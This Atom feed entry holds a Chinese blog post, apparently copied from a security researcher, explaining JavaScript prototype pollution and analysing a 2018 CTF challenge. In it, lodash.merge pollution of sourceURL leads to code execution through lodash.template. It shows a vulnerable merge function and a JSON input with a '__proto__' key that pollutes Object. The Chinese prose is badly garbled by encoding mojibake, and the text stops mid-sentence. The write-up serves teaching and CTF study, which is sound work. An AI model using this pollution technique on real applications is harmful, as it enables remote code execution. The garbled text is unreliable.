    <published>2024-11-23T16:00:00.000Z</published>
    <updated>2024-12-02T08:49:14.702Z</updated>
    
    <content type="html"><![CDATA[<h1>æ·±å…¥ç†è§£ JavaScript Prototype æ±¡æŸ“æ”»å‡»</h1><h2 id="1ã€prototypeå’Œ-proto-åˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿ">1ã€<code>prototype</code>å’Œ<code>__proto__</code>åˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>JavaScriptä¸­ï¼Œæˆ‘ä»¬å¦‚æœè¦å®šä¹‰ä¸€ä¸ªç±»ï¼Œéœ€è¦ä»¥å®šä¹‰â€œæ„é€ å‡½æ•°â€çš„æ–¹å¼æ¥å®šä¹‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function Foo() &#123;</span><br><span class="line">    this.bar = 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new Foo()</span><br></pre></td></tr></table></figure><p><code>Foo</code>å‡½æ•°çš„å†…å®¹ï¼Œå°±æ˜¯<code>Foo</code>ç±»çš„æ„é€ å‡½æ•°ï¼Œè€Œ<code>this.bar</code>å°±æ˜¯<code>Foo</code>ç±»çš„ä¸€ä¸ªå±æ€§ã€‚</p><blockquote><p>ä¸ºäº†ç®€åŒ–ç¼–å†™JavaScriptä»£ç ï¼ŒECMAScript 6åå¢åŠ äº†<code>class</code>è¯­æ³•ï¼Œä½†<code>class</code>å…¶å®åªæ˜¯ä¸€ä¸ªè¯­æ³•ç³–ã€‚</p></blockquote><p>ä¸€ä¸ªç±»å¿…ç„¶æœ‰ä¸€äº›æ–¹æ³•ï¼Œç±»ä¼¼å±æ€§<code>this.bar</code>ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å°†æ–¹æ³•å®šä¹‰åœ¨æ„é€ å‡½æ•°å†…éƒ¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function Foo() &#123;</span><br><span class="line">    this.bar = 1</span><br><span class="line">    this.show = function() &#123;</span><br><span class="line">        console.log(this.bar)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(new Foo()).show()</span><br></pre></td></tr></table></figure><p>ä½†è¿™æ ·å†™æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æ¯å½“æˆ‘ä»¬æ–°å»ºä¸€ä¸ªFooå¯¹è±¡æ—¶ï¼Œ<code>this.show = function...</code>å°±ä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œè¿™ä¸ª<code>show</code>æ–¹æ³•å®é™…ä¸Šæ˜¯ç»‘å®šåœ¨å¯¹è±¡ä¸Šçš„ï¼Œè€Œä¸æ˜¯ç»‘å®šåœ¨â€œç±»â€ä¸­ã€‚</p><p>æˆ‘å¸Œæœ›åœ¨åˆ›å»ºç±»çš„æ—¶å€™åªåˆ›å»ºä¸€æ¬¡<code>show</code>æ–¹æ³•ï¼Œè¿™æ—¶å€™å°±åˆ™éœ€è¦ä½¿ç”¨åŸå‹ï¼ˆprototypeï¼‰äº†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function Foo() &#123;</span><br><span class="line">    this.bar = 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Foo.prototype.show = function show() &#123;</span><br><span class="line">    console.log(this.bar)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let foo = new Foo()</span><br><span class="line">foo.show()</span><br></pre></td></tr></table></figure><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/46109c07-bfa1-4b92-93a2-d86049274035.png"><img src="https://www.leavesongs.com/media/attachment/2019/04/03/46109c07-bfa1-4b92-93a2-d86049274035.0dcd4f4c4400.png" alt="image.png"></a></p><p>æˆ‘ä»¬å¯ä»¥è®¤ä¸ºåŸå‹<code>prototype</code>æ˜¯ç±»<code>Foo</code>çš„ä¸€ä¸ªå±æ€§ï¼Œè€Œæ‰€æœ‰ç”¨<code>Foo</code>ç±»å®ä¾‹åŒ–çš„å¯¹è±¡ï¼Œéƒ½å°†æ‹¥æœ‰è¿™ä¸ªå±æ€§ä¸­çš„æ‰€æœ‰å†…å®¹ï¼ŒåŒ…æ‹¬å˜é‡å’Œæ–¹æ³•ã€‚æ¯”å¦‚ä¸Šå›¾ä¸­çš„<code>foo</code>å¯¹è±¡ï¼Œå…¶å¤©ç”Ÿå°±å…·æœ‰<code>foo.show()</code>æ–¹æ³•ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>Foo.prototype</code>æ¥è®¿é—®<code>Foo</code>ç±»çš„åŸå‹ï¼Œä½†<code>Foo</code>å®ä¾‹åŒ–å‡ºæ¥çš„å¯¹è±¡ï¼Œæ˜¯ä¸èƒ½é€šè¿‡prototypeè®¿é—®åŸå‹çš„ã€‚è¿™æ—¶å€™ï¼Œå°±è¯¥<code>__proto__</code>ç™»åœºäº†ã€‚</p><p>ä¸€ä¸ªFooç±»å®ä¾‹åŒ–å‡ºæ¥çš„fooå¯¹è±¡ï¼Œå¯ä»¥é€šè¿‡<code>foo.__proto__</code>å±æ€§æ¥è®¿é—®Fooç±»çš„åŸå‹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo.__proto__ == Foo.prototype</span><br></pre></td></tr></table></figure><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/3c4ed224-ae7b-4c8c-b16d-12b56524efee.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3c4ed224-ae7b-4c8c-b16d-12b56524efee.e270c75493b0.png" alt="image.png"></a></p><p>æ‰€ä»¥ï¼Œæ€»ç»“ä¸€ä¸‹ï¼š</p><ol><li><code>prototype</code>æ˜¯ä¸€ä¸ªç±»çš„å±æ€§ï¼Œæ‰€æœ‰ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°†ä¼šæ‹¥æœ‰<code>prototype</code>ä¸­çš„å±æ€§å’Œæ–¹æ³•</li><li>ä¸€ä¸ªå¯¹è±¡çš„<code>__proto__</code>å±æ€§ï¼ŒæŒ‡å‘è¿™ä¸ªå¯¹è±¡æ‰€åœ¨çš„ç±»çš„<code>prototype</code>å±æ€§</li></ol><h2 id="0x02-JavaScriptåŸå‹é“¾ç»§æ‰¿"><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">0x02 JavaScriptåŸå‹é“¾ç»§æ‰¿</a></h2><p>æ‰€æœ‰ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°†ä¼šæ‹¥æœ‰<code>prototype</code>ä¸­çš„å±æ€§å’Œæ–¹æ³•ï¼Œè¿™ä¸ªç‰¹æ€§è¢«ç”¨æ¥å®ç°JavaScriptä¸­çš„ç»§æ‰¿æœºåˆ¶ã€‚</p><p>æ¯”å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function Father() &#123;</span><br><span class="line">    this.first_name = &#x27;Donald&#x27;</span><br><span class="line">    this.last_name = &#x27;Trump&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Son() &#123;</span><br><span class="line">    this.first_name = &#x27;Melania&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Son.prototype = new Father()</span><br><span class="line"></span><br><span class="line">let son = new Son()</span><br><span class="line">console.log(`Name: $&#123;son.first_name&#125; $&#123;son.last_name&#125;`)</span><br></pre></td></tr></table></figure><p>Sonç±»ç»§æ‰¿äº†Fatherç±»çš„<code>last_name</code>å±æ€§ï¼Œæœ€åè¾“å‡ºçš„æ˜¯<code>Name: Melania Trump</code>ã€‚</p><p>æ€»ç»“ä¸€ä¸‹ï¼Œå¯¹äºå¯¹è±¡sonï¼Œåœ¨è°ƒç”¨<code>son.last_name</code>çš„æ—¶å€™ï¼Œå®é™…ä¸ŠJavaScriptå¼•æ“ä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š</p><ol><li>åœ¨å¯¹è±¡sonä¸­å¯»æ‰¾last_name</li><li>å¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™åœ¨<code>son.__proto__</code>ä¸­å¯»æ‰¾last_name</li><li>å¦‚æœä»ç„¶æ‰¾ä¸åˆ°ï¼Œåˆ™ç»§ç»­åœ¨<code>son.__proto__.__proto__</code>ä¸­å¯»æ‰¾last_name</li><li>ä¾æ¬¡å¯»æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°<code>null</code>ç»“æŸã€‚æ¯”å¦‚ï¼Œ<code>Object.prototype</code>çš„<code>__proto__</code>å°±æ˜¯<code>null</code></li></ol><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/08c5d5d0-62da-40f9-9e2c-77831fa7488e.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/08c5d5d0-62da-40f9-9e2c-77831fa7488e.51324dd04eef.png" alt="image.png"></a></p><p>JavaScriptçš„è¿™ä¸ªæŸ¥æ‰¾çš„æœºåˆ¶ï¼Œè¢«è¿ç”¨åœ¨é¢å‘å¯¹è±¡çš„ç»§æ‰¿ä¸­ï¼Œè¢«ç§°ä½œprototypeç»§æ‰¿é“¾ã€‚</p><p>ä»¥ä¸Šå°±æ˜¯æœ€åŸºç¡€çš„JavaScripté¢å‘å¯¹è±¡ç¼–ç¨‹ï¼Œæˆ‘ä»¬å¹¶ä¸æ·±å…¥ç ”ç©¶æ›´ç»†èŠ‚çš„å†…å®¹ï¼Œåªè¦ç‰¢è®°ä»¥ä¸‹å‡ ç‚¹å³å¯ï¼š</p><ol><li>æ¯ä¸ªæ„é€ å‡½æ•°(constructor)éƒ½æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡(prototype)</li><li>å¯¹è±¡çš„<code>__proto__</code>å±æ€§ï¼ŒæŒ‡å‘ç±»çš„åŸå‹å¯¹è±¡<code>prototype</code></li><li>JavaScriptä½¿ç”¨prototypeé“¾å®ç°ç»§æ‰¿æœºåˆ¶</li></ol><h2 id="0x03-åŸå‹é“¾æ±¡æŸ“æ˜¯ä»€ä¹ˆ"><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x03">0x03 åŸå‹é“¾æ±¡æŸ“æ˜¯ä»€ä¹ˆ</a></h2><p>ç¬¬ä¸€ç« ä¸­è¯´åˆ°ï¼Œ<code>foo.__proto__</code>æŒ‡å‘çš„æ˜¯<code>Foo</code>ç±»çš„<code>prototype</code>ã€‚é‚£ä¹ˆï¼Œå¦‚æœæˆ‘ä»¬ä¿®æ”¹äº†<code>foo.__proto__</code>ä¸­çš„å€¼ï¼Œæ˜¯ä¸æ˜¯å°±å¯ä»¥ä¿®æ”¹Fooç±»å‘¢ï¼Ÿ</p><p>åšä¸ªç®€å•çš„å®éªŒï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// fooæ˜¯ä¸€ä¸ªç®€å•çš„JavaScriptå¯¹è±¡</span><br><span class="line">let foo = &#123;bar: 1&#125;</span><br><span class="line"></span><br><span class="line">// foo.bar æ­¤æ—¶ä¸º1</span><br><span class="line">console.log(foo.bar)</span><br><span class="line"></span><br><span class="line">// ä¿®æ”¹fooçš„åŸå‹ï¼ˆå³Objectï¼‰</span><br><span class="line">foo.__proto__.bar = 2</span><br><span class="line"></span><br><span class="line">// ç”±äºæŸ¥æ‰¾é¡ºåºçš„åŸå› ï¼Œfoo.barä»ç„¶æ˜¯1</span><br><span class="line">console.log(foo.bar)</span><br><span class="line"></span><br><span class="line">// æ­¤æ—¶å†ç”¨Objectåˆ›å»ºä¸€ä¸ªç©ºçš„zooå¯¹è±¡</span><br><span class="line">let zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line">// æŸ¥çœ‹zoo.bar</span><br><span class="line">console.log(zoo.bar)</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œè™½ç„¶zooæ˜¯ä¸€ä¸ª<strong>ç©º</strong>å¯¹è±¡<code>&#123;&#125;</code>ï¼Œä½†<code>zoo.bar</code>çš„ç»“æœå±…ç„¶æ˜¯2ï¼š</p><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/4b63f1ef-6ed8-4448-9644-f11620822aaf.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/4b63f1ef-6ed8-4448-9644-f11620822aaf.2b2425c31fdb.png" alt="image.png"></a></p><p>åŸå› ä¹Ÿæ˜¾è€Œæ˜“è§ï¼šå› ä¸ºå‰é¢æˆ‘ä»¬ä¿®æ”¹äº†fooçš„åŸå‹<code>foo.__proto__.bar = 2</code>ï¼Œè€Œfooæ˜¯ä¸€ä¸ªObjectç±»çš„å®ä¾‹ï¼Œæ‰€ä»¥å®é™…ä¸Šæ˜¯ä¿®æ”¹äº†Objectè¿™ä¸ªç±»ï¼Œç»™è¿™ä¸ªç±»å¢åŠ äº†ä¸€ä¸ªå±æ€§barï¼Œå€¼ä¸º2ã€‚</p><p>åæ¥ï¼Œæˆ‘ä»¬åˆç”¨Objectç±»åˆ›å»ºäº†ä¸€ä¸ªzooå¯¹è±¡<code>let zoo = &#123;&#125;</code>ï¼Œzooå¯¹è±¡è‡ªç„¶ä¹Ÿæœ‰ä¸€ä¸ªbarå±æ€§äº†ã€‚</p><p>é‚£ä¹ˆï¼Œåœ¨ä¸€ä¸ªåº”ç”¨ä¸­ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶å¹¶ä¿®æ”¹äº†ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œé‚£ä¹ˆå°†å¯ä»¥å½±å“æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ç¥–ç±»çš„å¯¹è±¡ã€‚è¿™ç§æ”»å‡»æ–¹å¼å°±æ˜¯<strong>åŸå‹é“¾æ±¡æŸ“</strong>ã€‚</p><h2 id="0x04-å“ªäº›æƒ…å†µä¸‹åŸå‹é“¾ä¼šè¢«æ±¡æŸ“ï¼Ÿ"><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x04">0x04 å“ªäº›æƒ…å†µä¸‹åŸå‹é“¾ä¼šè¢«æ±¡æŸ“ï¼Ÿ</a></h2><p>åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå“ªäº›æƒ…å†µä¸‹å¯èƒ½å­˜åœ¨åŸå‹é“¾èƒ½è¢«æ”»å‡»è€…ä¿®æ”¹çš„æƒ…å†µå‘¢ï¼Ÿ</p><p>æˆ‘ä»¬æ€è€ƒä¸€ä¸‹ï¼Œå“ªäº›æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥è®¾ç½®<code>__proto__</code>çš„å€¼å‘¢ï¼Ÿå…¶å®æ‰¾æ‰¾èƒ½å¤Ÿæ§åˆ¶æ•°ç»„ï¼ˆå¯¹è±¡ï¼‰çš„â€œé”®åâ€çš„æ“ä½œå³å¯ï¼š</p><ul><li>å¯¹è±¡merge</li><li>å¯¹è±¡cloneï¼ˆå…¶å®å†…æ ¸å°±æ˜¯å°†å¾…æ“ä½œçš„å¯¹è±¡mergeåˆ°ä¸€ä¸ªç©ºå¯¹è±¡ä¸­ï¼‰</li></ul><p>ä»¥å¯¹è±¡mergeä¸ºä¾‹ï¼Œæˆ‘ä»¬æƒ³è±¡ä¸€ä¸ªç®€å•çš„mergeå‡½æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function merge(target, source) &#123;</span><br><span class="line">    for (let key in source) &#123;</span><br><span class="line">        if (key in source &amp;&amp; key in target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨åˆå¹¶çš„è¿‡ç¨‹ä¸­ï¼Œå­˜åœ¨èµ‹å€¼çš„æ“ä½œ<code>target[key] = source[key]</code>ï¼Œé‚£ä¹ˆï¼Œè¿™ä¸ªkeyå¦‚æœæ˜¯<code>__proto__</code>ï¼Œæ˜¯ä¸æ˜¯å°±å¯ä»¥åŸå‹é“¾æ±¡æŸ“å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬ç”¨å¦‚ä¸‹ä»£ç å®éªŒä¸€ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">let o1 = &#123;&#125;</span><br><span class="line">let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</span><br><span class="line">merge(o1, o2)</span><br><span class="line">console.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line">console.log(o3.b)</span><br></pre></td></tr></table></figure><p>ç»“æœæ˜¯ï¼Œåˆå¹¶è™½ç„¶æˆåŠŸäº†ï¼Œä½†åŸå‹é“¾æ²¡æœ‰è¢«æ±¡æŸ“ï¼š</p><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/ba16d965-3112-4f69-bf5e-4eddb034e6dc.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ba16d965-3112-4f69-bf5e-4eddb034e6dc.c5e82ea6e4f5.png" alt="image.png"></a></p><p>è¿™æ˜¯å› ä¸ºï¼Œæˆ‘ä»¬ç”¨JavaScriptåˆ›å»ºo2çš„è¿‡ç¨‹ï¼ˆ<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>ï¼‰ä¸­ï¼Œ<code>__proto__</code>å·²ç»ä»£è¡¨o2çš„åŸå‹äº†ï¼Œæ­¤æ—¶éå†o2çš„æ‰€æœ‰é”®åï¼Œä½ æ‹¿åˆ°çš„æ˜¯<code>[a, b]</code>ï¼Œ<code>__proto__</code>å¹¶ä¸æ˜¯ä¸€ä¸ªkeyï¼Œè‡ªç„¶ä¹Ÿä¸ä¼šä¿®æ”¹Objectçš„åŸå‹ã€‚</p><p>é‚£ä¹ˆï¼Œå¦‚ä½•è®©<code>__proto__</code>è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªé”®åå‘¢ï¼Ÿ</p><p>æˆ‘ä»¬å°†ä»£ç æ”¹æˆå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">let o1 = &#123;&#125;</span><br><span class="line">let o2 = JSON.parse(&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;)</span><br><span class="line">merge(o1, o2)</span><br><span class="line">console.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line">console.log(o3.b)</span><br></pre></td></tr></table></figure><p>å¯è§ï¼Œæ–°å»ºçš„o3å¯¹è±¡ï¼Œä¹Ÿå­˜åœ¨bå±æ€§ï¼Œè¯´æ˜Objectå·²ç»è¢«æ±¡æŸ“ï¼š</p><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/5e05a46f-3c7b-4ab4-869c-fe6fd19422b7.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5e05a46f-3c7b-4ab4-869c-fe6fd19422b7.64db1b9bbae7.png" alt="image.png"></a></p><p>è¿™æ˜¯å› ä¸ºï¼ŒJSONè§£æçš„æƒ…å†µä¸‹ï¼Œ<code>__proto__</code>ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªçœŸæ­£çš„â€œé”®åâ€ï¼Œè€Œä¸ä»£è¡¨â€œåŸå‹â€ï¼Œæ‰€ä»¥åœ¨éå†o2çš„æ—¶å€™ä¼šå­˜åœ¨è¿™ä¸ªé”®ã€‚</p><p>mergeæ“ä½œæ˜¯æœ€å¸¸è§å¯èƒ½æ§åˆ¶é”®åçš„æ“ä½œï¼Œä¹Ÿæœ€èƒ½è¢«åŸå‹é“¾æ”»å‡»ï¼Œå¾ˆå¤šå¸¸è§çš„åº“éƒ½å­˜åœ¨è¿™ä¸ªé—®é¢˜ã€‚</p><h2 id="0x05-Code-Breaking-2018-Thejs-åˆ†æ"><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x05-code-breaking-2018-thejs">0x05 Code-Breaking 2018 Thejs åˆ†æ</a></h2><p>æˆ‘åœ¨Code-Breaking 2018ä¸­å‡ºäº†ä¸€é“åŸå‹é“¾æ±¡æŸ“çš„CTFé¢˜ç›®ï¼Œä¸ºäº†æ›´åŠ è´´åˆçœŸå®ç¯å¢ƒï¼Œæˆ‘æ²¡æœ‰åˆ»æ„åŠ å¤ªå¤šè‡ªå·±çš„ä»£ç ï¼Œåç«¯ä¸»è¦ä»£ç å¦‚ä¸‹ï¼ˆå®Œæ•´ä»£ç å¯å‚è€ƒ<a href="https://github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js">è¿™é‡Œ</a>ï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// ...</span><br><span class="line">const lodash = require(&#x27;lodash&#x27;)</span><br><span class="line">// ...</span><br><span class="line"></span><br><span class="line">app.engine(&#x27;ejs&#x27;, function (filePath, options, callback) &#123; </span><br><span class="line">// define the template engine</span><br><span class="line">    fs.readFile(filePath, (err, content) =&gt; &#123;</span><br><span class="line">        if (err) return callback(new Error(err))</span><br><span class="line">        let compiled = lodash.template(content)</span><br><span class="line">        let rendered = compiled(&#123;...options&#125;)</span><br><span class="line"></span><br><span class="line">        return callback(null, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">//...</span><br><span class="line"></span><br><span class="line">app.all(&#x27;/&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    let data = req.session.data || &#123;language: [], category: []&#125;</span><br><span class="line">    if (req.method == &#x27;POST&#x27;) &#123;</span><br><span class="line">        data = lodash.merge(data, req.body)</span><br><span class="line">        req.session.data = data</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.render(&#x27;index&#x27;, &#123;</span><br><span class="line">        language: data.language, </span><br><span class="line">        category: data.category</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>lodashæ˜¯ä¸ºäº†å¼¥è¡¥JavaScriptåŸç”Ÿå‡½æ•°åŠŸèƒ½ä¸è¶³è€Œæä¾›çš„ä¸€ä¸ªè¾…åŠ©åŠŸèƒ½é›†ï¼Œå…¶ä¸­åŒ…å«å­—ç¬¦ä¸²ã€æ•°ç»„ã€å¯¹è±¡ç­‰æ“ä½œã€‚è¿™ä¸ªWebåº”ç”¨ä¸­ï¼Œä½¿ç”¨äº†lodashæä¾›çš„ä¸¤ä¸ªå·¥å…·ï¼š</p><ol><li><code>lodash.template</code> ä¸€ä¸ªç®€å•çš„æ¨¡æ¿å¼•æ“</li><li><code>lodash.merge</code> å‡½æ•°æˆ–å¯¹è±¡çš„åˆå¹¶</li></ol><p>å…¶å®æ•´ä¸ªåº”ç”¨é€»è¾‘å¾ˆç®€å•ï¼Œç”¨æˆ·æäº¤çš„ä¿¡æ¯ï¼Œç”¨mergeæ–¹æ³•åˆå¹¶åˆ°sessioné‡Œï¼Œå¤šæ¬¡æäº¤ï¼Œsessioné‡Œæœ€ç»ˆä¿å­˜ä½ æäº¤çš„æ‰€æœ‰ä¿¡æ¯ã€‚</p><p>è€Œè¿™é‡Œçš„<code>lodash.merge</code>æ“ä½œå®é™…ä¸Šå°±å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚</p><p>åœ¨æ±¡æŸ“åŸå‹é“¾åï¼Œæˆ‘ä»¬ç›¸å½“äºå¯ä»¥ç»™Objectå¯¹è±¡æ’å…¥ä»»æ„å±æ€§ï¼Œè¿™ä¸ªæ’å…¥çš„å±æ€§ååº”åœ¨æœ€åçš„<code>lodash.template</code>ä¸­ã€‚æˆ‘ä»¬çœ‹åˆ°<code>lodash.template</code>çš„ä»£ç ï¼š<a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165">https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// Use a sourceURL for easier debugging.</span><br><span class="line">var sourceURL = &#x27;sourceURL&#x27; in options ? &#x27;//# sourceURL=&#x27; + options.sourceURL + &#x27;\n&#x27; : &#x27;&#x27;;</span><br><span class="line">// ...</span><br><span class="line">var result = attempt(function() &#123;</span><br><span class="line">  return Function(importsKeys, sourceURL + &#x27;return &#x27; + source)</span><br><span class="line">  .apply(undefined, importsValues);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>optionsæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ŒsourceURLå–åˆ°äº†å…¶<code>options.sourceURL</code>å±æ€§ã€‚è¿™ä¸ªå±æ€§åŸæœ¬æ˜¯æ²¡æœ‰èµ‹å€¼çš„ï¼Œé»˜è®¤å–ç©ºå­—ç¬¦ä¸²ã€‚</p><p>ä½†å› ä¸ºåŸå‹é“¾æ±¡æŸ“ï¼Œæˆ‘ä»¬å¯ä»¥ç»™æ‰€æœ‰Objectå¯¹è±¡ä¸­éƒ½æ’å…¥ä¸€ä¸ª<code>sourceURL</code>å±æ€§ã€‚æœ€åï¼Œè¿™ä¸ª<code>sourceURL</code>è¢«æ‹¼æ¥è¿›<code>new Function</code>çš„ç¬¬äºŒä¸ªå‚æ•°ä¸­ï¼Œé€ æˆä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p><p>æˆ‘å°†å¸¦æœ‰<code>__proto__</code>çš„Payloadä»¥jsonçš„å½¢å¼å‘é€ç»™åç«¯ï¼Œå› ä¸ºexpressæ¡†æ¶æ”¯æŒæ ¹æ®Content-Typeæ¥è§£æè¯·æ±‚Bodyï¼Œè¿™é‡Œç»™æˆ‘ä»¬æ³¨å…¥åŸå‹æä¾›äº†å¾ˆå¤§æ–¹ä¾¿ï¼š</p><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/85fae11e-100b-41aa-9316-de81b93d0036.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/85fae11e-100b-41aa-9316-de81b93d0036.c6d39683853f.png" alt="image.png"></a></p><p>å¯è§ï¼Œæˆ‘ä»¬ä»£ç æ‰§è¡ŒæˆåŠŸï¼Œè¿”å›äº†idå‘½ä»¤çš„ç»“æœã€‚</p><p>æ•´ä¸ªæ¡ˆä¾‹æˆ‘è§‰å¾—æ˜¯ä¸€ä¸ªéå¸¸ç»å…¸çš„åŸå‹é“¾æ±¡æŸ“æ¼æ´æ•™ç¨‹ï¼Œä»£ç ä¸å¤šï¼Œé€»è¾‘ä¸å¤æ‚ï¼Œæ²¡æœ‰åˆ»æ„åˆ›é€ 